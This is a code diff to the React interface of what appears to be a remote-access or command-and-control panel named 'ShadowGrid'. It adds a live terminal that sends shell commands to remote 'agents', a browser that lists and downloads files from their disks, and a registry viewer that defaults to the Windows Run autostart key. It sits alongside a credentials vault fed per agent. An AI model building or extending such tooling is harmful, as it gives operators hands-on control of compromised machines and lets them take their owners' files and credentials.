@@ -1,7 +1,6 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef, useCallback } from 'react';
 import { api } from '../api';
 import Modal from '../components/Modal';
-import Terminal from '../components/Terminal';
 import ConfirmModal from '../components/ConfirmModal';
 
 function countryFlag(code) {
@@ -27,11 +26,13 @@ export default function AgentModal({ agent, onClose }) {
     api.getCredentials('agent_id=' + agent.id).then(setCreds).catch(() => {});
   }, [agent.id]);
 
-  const sendCommand = async (cmd) => {
-    const res = await api.createTask(agent.id, 'terminal', { cmd: cmd });
-    setTasks(prev => [{ id: res.id, task_type: 'terminal', args_json: JSON.stringify({ cmd: cmd }), status: 'pending', created_at: new Date().toISOString() }, ...prev]);
-    return 'Task #' + res.id + ' queued';
-  };
+  // Poll for new results every 3 seconds when terminal is active
+  useEffect(() => {
+    const interval = setInterval(() => {
+      api.getAgentResults(agent.id).then(setResults).catch(() => {});
+    }, 3000);
+    return () => clearInterval(interval);
+  }, [agent.id]);
 
   const statusColor = agent.status === 'dead' ? 'red' : agent.status === 'dormant' ? 'yellow' : 'green';
 
@@ -76,7 +77,7 @@ export default function AgentModal({ agent, onClose }) {
       {/* BODY */}
       <div className="modal-body">
         {/* TAB 0: TERMINAL */}
-        {tab === 0 && <Terminal agentId={agent.id} onSendCommand={sendCommand} />}
+        {tab === 0 && <TerminalTab agent={agent} results={results} />}
 
         {/* TAB 1: STORAGE */}
         {tab === 1 && <StorageTab agentId={agent.id} />}
@@ -109,50 +110,262 @@ export default function AgentModal({ agent, onClose }) {
   );
 }
 
+/* ========== TERMINAL TAB ========== */
+function TerminalTab({ agent, results }) {
+  const [history, setHistory] = useState([]);
+  const [input, setInput] = useState('');
+  const [working, setWorking] = useState(false);
+  const [pendingTaskId, setPendingTaskId] = useState(null);
+  const [cmdHistory, setCmdHistory] = useState([]);
+  const [historyIdx, setHistoryIdx] = useState(-1);
+  const termRef = useRef(null);
+  const inputRef = useRef(null);
+
+  // Watch for results matching our pending task
+  useEffect(() => {
+    if (pendingTaskId && results) {
+      const result = results.find(r => r.task_id === pendingTaskId);
+      if (result) {
+        setHistory(prev => [...prev, { type: 'output', text: result.output }]);
+        setWorking(false);
+        setPendingTaskId(null);
+      }
+    }
+  }, [results, pendingTaskId]);
+
+  const sendCommand = async (cmd) => {
+    if (!cmd.trim()) return;
+    setHistory(prev => [...prev, { type: 'input', text: cmd }]);
+    setCmdHistory(prev => [cmd, ...prev]);
+    setHistoryIdx(-1);
+    setInput('');
+    setWorking(true);
+
+    try {
+      const res = await api.createTask(agent.id, 'terminal', { cmd });
+      setPendingTaskId(res.id);
+    } catch (e) {
+      setHistory(prev => [...prev, { type: 'error', text: e.message }]);
+      setWorking(false);
+    }
+  };
+
+  const handleKeyDown = (e) => {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      sendCommand(input);
+    } else if (e.key === 'ArrowUp') {
+      e.preventDefault();
+      if (cmdHistory.length > 0) {
+        const newIdx = Math.min(historyIdx + 1, cmdHistory.length - 1);
+        setHistoryIdx(newIdx);
+        setInput(cmdHistory[newIdx]);
+      }
+    } else if (e.key === 'ArrowDown') {
+      e.preventDefault();
+      if (historyIdx > 0) {
+        const newIdx = historyIdx - 1;
+        setHistoryIdx(newIdx);
+        setInput(cmdHistory[newIdx]);
+      } else {
+        setHistoryIdx(-1);
+        setInput('');
+      }
+    }
+  };
+
+  useEffect(() => {
+    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
+  }, [history, working]);
+
+  useEffect(() => {
+    inputRef.current?.focus();
+  }, [working]);
+
+  return (
+    <div style={{ height: '100%', display: 'flex', flexDirection: 'column' }}>
+      <div ref={termRef} onClick={() => inputRef.current?.focus()} style={{
+        flex: 1, background: '#0a0c10', padding: 12, fontFamily: 'var(--font-mono)',
+        fontSize: 12, color: '#c8c8c8', overflow: 'auto', cursor: 'text',
+        minHeight: 400,
+      }}>
+        <div style={{ color: 'var(--green)', marginBottom: 8 }}>
+          [ShadowGrid] Connected to {agent.hostname || agent.id.substring(0,8)} ({agent.os || 'unknown'})
+        </div>
+        {history.map((entry, i) => (
+          <div key={i} style={{ marginBottom: 2 }}>
+            {entry.type === 'input' && (
+              <span><span style={{ color: 'var(--green)' }}>{'>'} </span>{entry.text}</span>
+            )}
+            {entry.type === 'output' && (
+              <pre style={{ margin: 0, whiteSpace: 'pre-wrap', color: '#e0e0e0' }}>{entry.text}</pre>
+            )}
+            {entry.type === 'error' && (
+              <span style={{ color: 'var(--red)' }}>✕ {entry.text}</span>
+            )}
+          </div>
+        ))}
+        {working && <div style={{ color: 'var(--yellow)' }}>⏳ executing...</div>}
+        <div style={{ display: 'flex', alignItems: 'center' }}>
+          <span style={{ color: 'var(--green)' }}>{'>'} </span>
+          <input ref={inputRef} value={input} onChange={e => setInput(e.target.value)}
+            onKeyDown={handleKeyDown} disabled={working}
+            autoFocus
+            spellCheck="false"
+            style={{
+              flex: 1, background: 'transparent', border: 'none', outline: 'none',
+              color: '#e0e0e0', fontFamily: 'var(--font-mono)', fontSize: 12,
+              padding: 0, margin: 0,
+            }} />
+        </div>
+      </div>
+    </div>
+  );
+}
+
 /* ========== STORAGE TAB ========== */
 function StorageTab({ agentId }) {
-  const [path, setPath] = useState(['C:', 'Users']);
+  const [path, setPath] = useState(['C:']);
   const [files, setFiles] = useState([]);
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState(null);
+  const [pendingTaskId, setPendingTaskId] = useState(null);
 
-  const loadFiles = () => {
-    api.createTask(agentId, 'storage_list', { path: path.join('\\') });
+  const currentPath = path.join('\\');
+
+  // Poll for results when a task is pending
+  useEffect(() => {
+    if (!pendingTaskId) return;
+    const interval = setInterval(async () => {
+      try {
+        const results = await api.getAgentResults(agentId);
+        const result = results.find(r => r.task_id === pendingTaskId);
+        if (result) {
+          clearInterval(interval);
+          setPendingTaskId(null);
+          setLoading(false);
+          try {
+            const parsed = JSON.parse(result.output);
+            if (Array.isArray(parsed)) {
+              // Sort: directories first, then alphabetically
+              parsed.sort((a, b) => {
+                if (a.is_dir && !b.is_dir) return -1;
+                if (!a.is_dir && b.is_dir) return 1;
+                return a.name.localeCompare(b.name);
+              });
+              setFiles(parsed);
+              setError(null);
+            } else {
+              setError(result.output);
+            }
+          } catch {
+            setError(result.output);
+          }
+        }
+      } catch {}
+    }, 2000);
+    return () => clearInterval(interval);
+  }, [pendingTaskId, agentId]);
+
+  const loadFiles = async (targetPath) => {
+    setLoading(true);
+    setError(null);
+    setFiles([]);
+    try {
+      const res = await api.createTask(agentId, 'storage_list', { path: targetPath || currentPath });
+      setPendingTaskId(res.id);
+    } catch (e) {
+      setLoading(false);
+      setError(e.message);
+    }
+  };
+
+  const navigateTo = (folder) => {
+    const newPath = [...path, folder];
+    setPath(newPath);
+    loadFiles(newPath.join('\\'));
+  };
+
+  const navigateUp = () => {
+    if (path.length > 1) {
+      const newPath = path.slice(0, -1);
+      setPath(newPath);
+      loadFiles(newPath.join('\\'));
+    }
+  };
+
+  const navigateBreadcrumb = (index) => {
+    const newPath = path.slice(0, index + 1);
+    setPath(newPath);
+    loadFiles(newPath.join('\\'));
+  };
+
+  const formatSize = (bytes) => {
+    if (bytes === 0) return '-';
+    if (bytes < 1024) return bytes + ' B';
+    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
+    if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
+    return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' GB';
+  };
+
+  const formatDate = (ts) => {
+    if (!ts) return '-';
+    return new Date(ts * 1000).toLocaleString();
+  };
+
+  const downloadFile = async (fileName) => {
+    const filePath = currentPath + '\\' + fileName;
+    await api.createTask(agentId, 'storage_read', { path: filePath });
   };
 
   return (
     <div style={{ padding: 16 }}>
-      <div className="breadcrumb">
+      <div className="breadcrumb" style={{ marginBottom: 8 }}>
         {path.map((p, i) => (
           <span key={i}>
-            <span onClick={() => setPath(path.slice(0, i + 1))}>{p}</span>
-            {i < path.length - 1 && <span className="sep">&gt;</span>}
+            <span style={{ cursor: 'pointer', color: 'var(--green)' }} onClick={() => navigateBreadcrumb(i)}>{p}</span>
+            {i < path.length - 1 && <span className="sep" style={{ margin: '0 4px', color: 'var(--text-muted)' }}>&gt;</span>}
           </span>
         ))}
       </div>
-      <div className="toolbar">
-        <button className="btn btn-sm btn-green" onClick={loadFiles}>UPLOAD</button>
-        <button className="btn btn-sm btn-green">DOWNLOAD</button>
-        <button className="btn btn-sm btn-red">DELETE</button>
-        <button className="btn btn-sm">NEW FOLDER</button>
-        <button className="btn btn-sm" onClick={loadFiles}>REFRESH</button>
+      <div className="toolbar" style={{ marginBottom: 12, display: 'flex', gap: 8 }}>
+        <button className="btn btn-sm" onClick={navigateUp} disabled={path.length <= 1}>⬆ UP</button>
+        <button className="btn btn-sm" onClick={() => loadFiles()} disabled={loading}>
+          {loading ? '⏳ LOADING...' : '🔄 REFRESH'}
+        </button>
       </div>
+      {error && <div style={{ color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 11, marginBottom: 8 }}>Error: {error}</div>}
       <table>
         <thead><tr><th>Name</th><th>Size</th><th>Type</th><th>Modified</th><th>Actions</th></tr></thead>
         <tbody>
-          <tr>
-            <td style={{ color: 'var(--yellow)' }}>📁 Documents</td>
-            <td>-</td><td>Folder</td><td>-</td>
-            <td><button className="btn btn-sm" onClick={() => setPath([...path, 'Documents'])}>OPEN</button></td>
-          </tr>
-          <tr>
-            <td style={{ color: 'var(--yellow)' }}>📁 Desktop</td>
-            <td>-</td><td>Folder</td><td>-</td>
-            <td><button className="btn btn-sm" onClick={() => setPath([...path, 'Desktop'])}>OPEN</button></td>
-          </tr>
-          {files.length === 0 && (
+          {files.length === 0 && !loading && (
             <tr><td colSpan={5} style={{ color: 'var(--text-disabled)', textAlign: 'center' }}>
               Click REFRESH to browse the agent filesystem
             </td></tr>
           )}
+          {loading && (
+            <tr><td colSpan={5} style={{ color: 'var(--yellow)', textAlign: 'center' }}>
+              ⏳ Waiting for agent response...
+            </td></tr>
+          )}
+          {files.map((f, i) => (
+            <tr key={i}>
+              <td style={{ color: f.is_dir ? 'var(--yellow)' : 'var(--text-sec)', cursor: f.is_dir ? 'pointer' : 'default' }}
+                  onClick={() => f.is_dir && navigateTo(f.name)}>
+                {f.is_dir ? '📁 ' : '📄 '}{f.name}
+              </td>
+              <td>{f.is_dir ? '-' : formatSize(f.size)}</td>
+              <td>{f.is_dir ? 'Folder' : 'File'}</td>
+              <td style={{ fontSize: 11 }}>{formatDate(f.modified)}</td>
+              <td>
+                {f.is_dir ? (
+                  <button className="btn btn-sm" onClick={() => navigateTo(f.name)}>OPEN</button>
+                ) : (
+                  <button className="btn btn-sm" onClick={() => downloadFile(f.name)}>DOWNLOAD</button>
+                )}
+              </td>
+            </tr>
+          ))}
         </tbody>
       </table>
     </div>
@@ -358,54 +571,158 @@ function VaultTab({ creds, agentId }) {
 
 /* ========== CONFIG STORE TAB ========== */
 function ConfigStoreTab({ agentId }) {
-  const [selectedKey, setSelectedKey] = useState('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run');
-  const treeData = [
-    { name: 'HKEY_LOCAL_MACHINE', children: [
-      { name: 'SOFTWARE', children: [
-        { name: 'Microsoft', children: [
-          { name: 'Windows', children: [
-            { name: 'CurrentVersion', children: [
-              { name: 'Run', key: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' },
-              { name: 'RunOnce', key: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce' },
-              { name: 'Uninstall', key: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall' },
-            ]},
-          ]},
-          { name: 'Policies' },
-          { name: '.NETFramework' },
-        ]},
-      ]},
-    ]},
-  ];
+  const [hive, setHive] = useState('HKLM');
+  const [regPath, setRegPath] = useState('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run');
+  const [pathInput, setPathInput] = useState('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run');
+  const [values, setValues] = useState([]);
+  const [subkeys, setSubkeys] = useState([]);
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState(null);
+  const [pendingValuesTask, setPendingValuesTask] = useState(null);
+  const [pendingSubkeysTask, setPendingSubkeysTask] = useState(null);
 
-  const refreshReg = () => {
-    api.createTask(agentId, 'config_store_read', { key: selectedKey });
+  // Parse "HKLM\SOFTWARE\..." into hive + path
+  const parsePath = (fullPath) => {
+    const parts = fullPath.split('\\');
+    const h = parts[0].replace('HKEY_LOCAL_MACHINE', 'HKLM')
+      .replace('HKEY_CURRENT_USER', 'HKCU')
+      .replace('HKEY_CLASSES_ROOT', 'HKCR')
+      .replace('HKEY_USERS', 'HKU');
+    return { hive: h, path: parts.slice(1).join('\\') };
   };
 
-  const renderTree = (nodes, depth = 0) => nodes.map((n, i) => (
-    <div key={i}>
-      <div className="reg-node" style={{ paddingLeft: depth * 20 }} onClick={() => n.key && setSelectedKey(n.key)}>
-        <span className="reg-icon">{n.children ? '▼' : '▶'}</span> {n.name}
-      </div>
-      {n.children && renderTree(n.children, depth + 1)}
-    </div>
-  ));
+  // Poll for subkeys result
+  useEffect(() => {
+    if (!pendingSubkeysTask) return;
+    const interval = setInterval(async () => {
+      try {
+        const results = await api.getAgentResults(agentId);
+        const result = results.find(r => r.task_id === pendingSubkeysTask);
+        if (result) {
+          clearInterval(interval);
+          setPendingSubkeysTask(null);
+          try {
+            const parsed = JSON.parse(result.output);
+            if (Array.isArray(parsed)) {
+              setSubkeys(parsed);
+            }
+          } catch {}
+          setLoading(false);
+        }
+      } catch {}
+    }, 2000);
+    return () => clearInterval(interval);
+  }, [pendingSubkeysTask, agentId]);
+
+  // Poll for values result
+  useEffect(() => {
+    if (!pendingValuesTask) return;
+    const interval = setInterval(async () => {
+      try {
+        const results = await api.getAgentResults(agentId);
+        const result = results.find(r => r.task_id === pendingValuesTask);
+        if (result) {
+          clearInterval(interval);
+          setPendingValuesTask(null);
+          try {
+            const parsed = JSON.parse(result.output);
+            if (parsed && !Array.isArray(parsed)) {
+              setValues(prev => [...prev, parsed]);
+            }
+          } catch {}
+        }
+      } catch {}
+    }, 2000);
+    return () => clearInterval(interval);
+  }, [pendingValuesTask, agentId]);
+
+  const browseKey = async (fullPath) => {
+    const { hive: h, path: p } = parsePath(fullPath || pathInput);
+    setHive(h);
+    setRegPath(p);
+    setPathInput(fullPath || pathInput);
+    setLoading(true);
+    setError(null);
+    setSubkeys([]);
+    setValues([]);
+
+    try {
+      // List subkeys
+      const res = await api.createTask(agentId, 'config_store_list', { hive: h, path: p });
+      setPendingSubkeysTask(res.id);
+    } catch (e) {
+      setLoading(false);
+      setError(e.message);
+    }
+  };
+
+  const navigateSubkey = (subkeyName) => {
+    const newFullPath = hive + '\\' + (regPath ? regPath + '\\' : '') + subkeyName;
+    setPathInput(newFullPath);
+    browseKey(newFullPath);
+  };
+
+  const handleKeyDown = (e) => {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      browseKey();
+    }
+  };
+
+  const regTypeToString = (t) => {
+    const types = { 1: 'REG_SZ', 2: 'REG_EXPAND_SZ', 3: 'REG_BINARY', 4: 'REG_DWORD', 7: 'REG_MULTI_SZ', 11: 'REG_QWORD' };
+    return types[t] || 'REG_' + t;
+  };
 
   return (
     <div style={{ padding: 16 }}>
       <div className="section-label">Registry Browser</div>
+      <div style={{ display: 'flex', gap: 8, marginBottom: 16 }}>
+        <input
+          type="text"
+          className="form-input"
+          value={pathInput}
+          onChange={e => setPathInput(e.target.value)}
+          onKeyDown={handleKeyDown}
+          placeholder="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+          spellCheck="false"
+          style={{ flex: 1, fontFamily: 'var(--font-mono)', fontSize: 11 }}
+        />
+        <button className="btn btn-sm btn-green" onClick={() => browseKey()} disabled={loading}>
+          {loading ? '⏳' : 'BROWSE'}
+        </button>
+      </div>
+      {error && <div style={{ color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 11, marginBottom: 8 }}>Error: {error}</div>}
       <div style={{ display: 'grid', gridTemplateColumns: '280px 1fr', gap: 16 }}>
         <div style={{ border: '1px solid var(--border)', background: 'var(--term-bg)', padding: 12, fontFamily: 'var(--font-mono)', fontSize: 11, minHeight: 300, overflowY: 'auto' }}>
-          {renderTree(treeData)}
+          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)', marginBottom: 8, textTransform: 'uppercase', letterSpacing: '1.4px' }}>
+            Subkeys
+          </div>
+          {loading && <div style={{ color: 'var(--yellow)' }}>⏳ Loading...</div>}
+          {subkeys.length === 0 && !loading && <div style={{ color: 'var(--text-disabled)' }}>No subkeys found</div>}
+          {subkeys.map((sk, i) => (
+            <div key={i} className="reg-node" style={{ padding: '4px 8px', cursor: 'pointer', color: 'var(--green)' }}
+                 onClick={() => navigateSubkey(sk)}>
+              <span className="reg-icon">📁</span> {sk}
+            </div>
+          ))}
         </div>
         <div>
           <div style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)', marginBottom: 8, textTransform: 'uppercase', letterSpacing: '1.4px' }}>
-            {selectedKey}
+            {hive}\\{regPath}
           </div>
-          <button className="btn btn-sm" onClick={refreshReg} style={{ marginBottom: 12 }}>REFRESH</button>
           <table>
             <thead><tr><th>Name</th><th>Type</th><th>Data</th></tr></thead>
             <tbody>
-              <tr><td colSpan={3} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>Click REFRESH to load registry values</td></tr>
+              {values.length === 0 ? (
+                <tr><td colSpan={3} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>Click BROWSE to load registry values</td></tr>
+              ) : values.map((v, i) => (
+                <tr key={i}>
+                  <td>{v.name}</td>
+                  <td style={{ color: 'var(--text-muted)' }}>{regTypeToString(v.type)}</td>
+                  <td style={{ fontFamily: 'var(--font-mono)', fontSize: 11, wordBreak: 'break-all' }}>{v.value}</td>
+                </tr>
+              ))}
             </tbody>
           </table>
         </div>
